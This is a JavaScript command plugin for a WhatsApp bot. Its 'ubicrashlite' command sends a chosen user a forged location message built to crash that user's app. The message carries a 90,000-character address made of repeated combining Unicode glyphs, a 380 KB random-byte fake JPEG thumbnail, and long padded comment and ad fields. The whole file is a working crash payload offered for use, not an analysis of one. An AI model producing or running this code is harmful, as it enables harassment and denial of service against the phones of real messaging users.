let handler = async (m, { conn }) => {
  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat;
  if (jid === conn.user.id) {
    return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m });
  }

  const objetivo = jid;

  const caracter = 'ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵';
  const address = caracter.repeat(Math.floor(90000 / caracter.length)).slice(0, 90000);

  const header = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]);
  const fill = Buffer.alloc(380 * 1024 - header.length); // Reducido a 380 KB
  for (let i = 0; i < fill.length; i++) fill[i] = Math.floor(Math.random() * 256);
  const thumbnailPesado = Buffer.concat([header, fill]);

  const fakeLoc = {
    key: {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(m.chat ? { remoteJid: "status@broadcast" } : {})
    },
    message: {
      locationMessage: {
        name: 'Tobi',
        degreesLatitude: 19.432608,
        degreesLongitude: -99.133209,
        address: address,
        jpegThumbnail: thumbnailPesado,
        isLive: false,
        livePeriod: 9999999,
        accuracyInMeters: 999,
        speedInMps: 10,
        degreesClockwiseFromMagneticNorth: 180,
        comment: '𑆿𑆿'.repeat(200), // reducido

        contextInfo: {
          forwardingScore: 99,
          isForwarded: true,
          externalAdReply: {
            title: '𑇂'.repeat(200),
            body: '𑇂𑆿'.repeat(200),
            thumbnail: thumbnailPesado,
            sourceUrl: 'https://youtube.com/@p.a.zinwebkkkkj'
          }
        }
      }
    }
  };

  await conn.relayMessage(objetivo, fakeLoc.message, { messageId: conn.generateMessageTag() });
};

handler.command = /^ubicrashlite$/i;
handler.owner = true;

export default handler;